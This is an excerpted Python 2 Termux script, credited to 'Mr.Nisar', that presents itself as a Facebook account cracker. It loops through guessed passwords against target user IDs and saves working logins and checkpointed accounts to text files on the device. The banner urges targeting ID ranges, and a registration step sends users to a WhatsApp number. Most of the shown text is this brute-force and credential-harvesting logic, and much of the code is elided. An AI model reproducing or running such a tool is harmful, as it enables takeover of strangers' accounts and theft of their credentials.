...
__author__ = 'Mr.Nisar'
__copyright = 'All rights reserved . Copyright  Mr.Nisar'
...
os.system('git pull')
os.system('clear')
logo = ('echo -e "\n\n       NISAR MAHSUD    \n   BEST TERMUX COMMND   \n   OK ID WALA CMND  \n   OK IDZ NEKLANA K LYA 10006 WALA LINK TARGAT KARO   \n   FB ACOUNT NISAR AHMAD   (NISAR MAHSUD ) \n-----------------------------------------------" ')  
def reg():
    os.system('clear')
    print logo
    print ''
    ...
    try:
        ...
        reg2()
    os.system('cd nnnnn && npm install')
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd nnnnn && node index.js &')
    time.sleep(5)
    ip()
...
def reg2():
    ...
    print ''
    print ' \033[1;92mCopy and press enter , And Send Me On +923098924196'
    print ''
    ...
    os.system('xdg-open https://wa.me/+923098924196')
...
def a_s():
    ...
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mNK NISAR KING OF FACEBOOK\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[NK-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/NIS_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[NK-CP] ' + uid + ' | ' + pass1
                cp = open('NIS_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[NK-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/NIS_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[NK-CP] ' + uid + ' | ' + pass2
                    cp = open('NIS_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;93m[NK-CP] ' + uid + ' | ' + pass3
                        cp = open('NIS_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[NK-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/NIS_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[NK-CP] ' + uid + ' | ' + pass4
                            cp = open('NIS_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[NK-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/NIS_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[NK-CP] ' + uid + ' | ' + pass5
                                cp = open('NIS_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[NK-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/NIS_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[NK-CP] ' + uid + ' | ' + pass6
                                    cp = open('NIS_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[NK-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/NIS_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[NK-CP] ' + uid + ' | ' + pass7
                                        cp = open('NIS_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;92m[NK-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/NIS_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
